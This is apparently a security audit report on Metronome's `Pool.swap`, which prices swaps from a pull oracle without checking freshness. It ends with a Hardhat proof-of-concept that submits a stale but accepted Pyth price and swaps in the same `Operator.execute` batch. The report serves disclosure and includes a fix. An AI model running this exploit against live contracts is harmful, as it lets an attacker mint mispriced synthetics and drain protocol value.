### Title
Public callers can atomically submit an old pull-oracle price and swap at the stale quote - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary

`Pool.swap` prices synthetic-token conversions exclusively through `PoolRegistry.masterOracle()` and does not verify that the resulting quote was produced from the newest available oracle observation. [1](#0-0)  An unprivileged caller can batch a pull-oracle update with a stale, still-accepted signed price update and a profitable `swap` through `Operator.execute`. [2](#0-1) 

### Finding Description

`Operator.execute` is publicly callable and performs arbitrary caller-supplied calls while recording the original EOA in transient storage. [2](#0-1)  Protocol contracts receiving the call through the operator recover that original caller via `SynthContext._msgSender()`. [3](#0-2) 

The mainnet pull-oracle integration is designed to allow an oracle update and a protocol action in the same `Operator.execute` batch. [4](#0-3)  Metronome does not check that the update payload is the newest signed observation; the only barrier shown is the oracle rejecting a price that is too far behind with `price-too-behind`. [5](#0-4) 

After the update, `Pool.swap` burns the caller’s input synthetic token, computes the output entirely from `masterOracle().quote`, subtracts the configured fee, and mints the output token to the caller. [6](#0-5)  If the signed update carries an old but still accepted price that overvalues `syntheticTokenIn_`, the swap mints more `syntheticTokenOut_` than the current-market quote permits. [7](#0-6) 

The reachable checks do not prevent this sequence: `swap` only checks the shutdown flag, reentrancy, registered synthetics, swap activation, and the caller’s token balance. [8](#0-7)  No privileged keeper is required because both the oracle update and swap can be initiated by the same attacker-controlled EOA. [9](#0-8) 

### Impact Explanation

A stale quote that overvalues the input synthetic lets the attacker mint excess output synthetic against Metronome collateral. [10](#0-9)  Those excess synthetics are claims on the protocol’s collateralized debt system even though the attacker did not provide current-market value for them, causing protocol-wide mispricing and potential insolvency. [11](#0-10) 

### Likelihood Explanation

The attacker needs a supported pull-oracle feed whose stored update is older than the selected signed update, while the selected update remains inside the oracle’s accepted freshness window. [5](#0-4)  The attacker also needs the input synthetic, but this can be held capital or borrowed externally before the transaction. [12](#0-11) 

The end-to-end tests already demonstrate the exact public execution pattern: call the pull oracle’s update function and immediately invoke a Metronome function through `Operator.execute`. [13](#0-12)  In a fast-moving market, even an update near the maximum accepted age can materially differ from the current market price. [5](#0-4) 

### Recommendation

Require sensitive oracle-priced operations to use a much tighter maximum price age than the generic oracle stale period, and extend `IMasterOracle` or the provider adapter so `Pool.swap`, issuance, withdrawals, and liquidations can enforce a maximum acceptable `publishTime`/`updatedAt`. [14](#0-13)  Where the pull oracle supports it, reject update payloads whose publish time is older than the newest available signed observation for the feed rather than accepting any observation inside the stale window. [15](#0-14) 

### Proof of Concept

The following Hardhat mainnet-fork test demonstrates the atomic pattern: restore a stale oracle state, publish a signed historical-but-accepted Pyth update, and call `Pool.swap` in the same transaction through `Operator.execute`.

```ts
import {expect} from 'chai'
import {ethers} from 'hardhat'
import axios from 'axios'
import {parseEther} from '../helpers'
import {setTokenBalance} from './helpers'

const PYTH = '0x4305fb66699c3b2702d4d05cf36551390a4c69c6'
const ETH_FEED_ID =
  '0xff61491a931112ddf1bd8147cd1b641375f79f5825126d665480874634fd0ace'

const pythAbi = [
  'function getUpdateFee(bytes[] updateData) view returns (uint256)',
  'function updatePriceFeeds(bytes[] updateData) payable',
]

it('swaps using a stale pull-oracle update', async () => {
  const [attacker] = await ethers.getSigners()

  const pool = await ethers.getContractAt(
    [
      'function swap(address,address,uint256) returns (uint256,uint256)',
      'function quoteSwapOut(address,address,uint256) view returns (uint256,uint256)',
    ],
    POOL_ADDRESS,
    attacker
  )
  const operator = await ethers.getContractAt(
    [
      'function execute(tuple(address target,uint256 value,bytes callData)[] calls) payable returns (bytes[])',
    ],
    OPERATOR_ADDRESS,
    attacker
  )
  const pyth = await ethers.getContractAt(pythAbi, PYTH, attacker)

  const amountIn = parseEther('1')
  await setTokenBalance(MSETH_ADDRESS, attacker.address, amountIn)

  // Select an old update that is still inside the oracle's stale window.
  const stalePublishTime = Math.floor(Date.now() / 1000) - MAX_ACCEPTED_STALE_SECONDS + 5
  const response = await axios.get(
    `https://hermes.pyth.network/v2/updates/price/${stalePublishTime}`,
    {
      params: {
        'ids[]': [ETH_FEED_ID],
        encoding: 'hex',
      },
    }
  )
  const staleUpdate = response.data.binary.data.map((data: string) =>
    data.startsWith('0x') ? data : `0x${data}`
  )

  // Optionally get the independent current quote for comparison before overwriting oracle state.
  const {data: latestResponse} = await axios.get(
    'https://hermes.pyth.network/v2/updates/price/latest',
    {params: {'ids[]': [ETH_FEED_ID], encoding: 'hex', parsed: true}}
  )
  const currentEthUsd = BigInt(latestResponse.parsed[0].price.price)

  const fee = await pyth.getUpdateFee(staleUpdate)
  const calls = [
    {
      target: PYTH,
      value: fee,
      callData: pyth.interface.encodeFunctionData('updatePriceFeeds', [staleUpdate]),
    },
    {
      target: pool.address,
      value: 0,
      callData: pool.interface.encodeFunctionData('swap', [
        MSETH_ADDRESS,
        MSUSD_ADDRESS,
        amountIn,
      ]),
    },
  ]

  const msUsd = await ethers.getContractAt('IERC20', MSUSD_ADDRESS)
  const before = await msUsd.balanceOf(attacker.address)

  await operator.execute(calls, {value: fee})

  const minted = (await msUsd.balanceOf(attacker.address)).sub(before)

  // For an old high ETH price, the minted amount exceeds the current-market value.
  expect(minted).to.be.gt(amountIn.mul(currentEthUsd).div(parseEther('1')))
})
```

On a fork where the selected signed update is newer than the feed’s stored update but older than the maximum accepted age, the first call updates the pull oracle and the second immediately consumes that stale quote. [13](#0-12)  The swap then burns the input and mints the stale-priced output without any additional freshness check in `Pool.swap`. [6](#0-5)
